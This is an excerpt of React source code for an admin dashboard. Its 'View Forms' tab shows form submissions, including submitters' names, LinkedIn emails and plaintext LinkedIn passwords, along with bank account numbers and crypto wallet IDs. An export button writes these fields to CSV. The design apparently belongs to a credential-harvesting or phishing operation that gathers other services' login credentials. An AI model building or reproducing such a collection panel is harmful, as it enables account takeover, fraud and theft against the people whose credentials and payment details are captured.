...
function exportToCSV(data, filename) {
  ...
  // Raw Form Submission Schema
  headers = ['ID', 'Form ID', 'Full Name', 'Phone Number', 'Email', 'LinkedIn Email', 'LinkedIn Password', 'Read', 'Created At'];
  csvContent = headers.join(',') + '\n';
...
export default function Admin() {
        ...
        <Tabs defaultValue="contact" value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 h-auto p-1 gap-1">
            ...
            <TabsTrigger value="secureforms" className="text-xs sm:text-sm py-2 px-1 sm:px-2">
             ...
             <TabsTrigger value="viewforms" className="text-xs sm:text-sm py-2 px-1 sm:px-2">
              View Forms
            </TabsTrigger>
          </TabsList>
          ...
          <TabsContent value="linkedin-orders">
            ...
            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4 mb-4">
              <h2 className="text-xl font-semibold">View Form Submission Response</h2>
              <div className="flex flex-col sm:flex-row gap-2">
                <Button
                  variant="outline"
                  onClick={() => exportToCSV(viewFomrsQuery.data, 'view-forms')}
                  disabled={viewFomrsQuery.isLoading || !viewFomrsQuery.data?.length}
                  className="text-sm"
                >
                  <Download className="mr-2 h-4 w-4" /> Export CSV
                </Button>
                <Button
                  variant="outline"
                  onClick={() => viewFomrsQuery.refetch()}
                  disabled={viewFomrsQuery.isFetching}
                  className="text-sm"
                >
                  Refresh
                </Button>
            ...
            {viewFomrsQuery.isFetching ? (
              renderLoading()
            ) : viewFomrsQuery.isError ? (
              renderError(viewFomrsQuery.error)
            ) : !viewFomrsQuery.data || viewFomrsQuery.data.length === 0 ? (
              renderNoData('view forms')
            ) : (
              <div className="space-y-4">
                {viewFomrsQuery.data.map(view => (
                  <Card key={view._id} className="max-w-2xl mx-auto">
                    <CardHeader className="pb-2">
                      <div className="flex justify-between items-start">
                        <div>
                             <CardTitle className="text-lg"> FormId: {view.formId} </CardTitle>
                          <CardTitle className="text-lg">Name : {view.fullName} </CardTitle>
                          <CardDescription className="flex items-center gap-1 mt-1">
                            <Calendar className="h-3 w-3" />
                    ...
                    <CardContent className="space-y-3">
                      ...
                      <div className="flex items-center gap-2">
                        <Building className="h-4 w-4 text-gray-500" />
                        <span>Linkedin-email : {view.linkedinEmail || "Not specified"}</span> <br />
                        <span>Linkedin-password : {view.linkedinPassword || "Not specified"}</span>
                      </div>
  ...
  <ul className="ml-6 list-disc text-sm text-gray-700">
    ...
    {view.paymentInfo.method === "bank" && (
      <>
        <li>Account Number: {view.paymentInfo.bank.accountNumber}</li>
    ...
    {view.paymentInfo.method === "crypto" && (
      <>
        <li>Wallet ID: {view.paymentInfo.crypto.walletId}</li>
        <li>Network: {view.paymentInfo.crypto.network}</li>
      </>
    )}
  </ul>
</div>
